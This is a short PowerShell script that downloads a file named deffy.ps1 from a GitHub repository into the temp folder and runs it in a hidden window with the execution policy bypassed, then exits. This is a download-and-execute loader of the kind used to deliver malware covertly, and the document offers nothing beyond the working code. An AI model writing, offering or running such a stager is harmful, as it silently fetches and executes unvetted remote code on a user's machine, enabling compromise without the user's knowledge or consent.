# Define the URL and output file path
$url = 'https://raw.githubusercontent.com/0rx1/workshopdeffy/main/deffy.ps1'
$output = "$env:TEMP\deffy.ps1"

# Start the background process
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -Command `"Invoke-WebRequest -Uri '$url' -OutFile '$output'; & '$output'`"" -WindowStyle Hidden

# Exit the current PowerShell session
exit
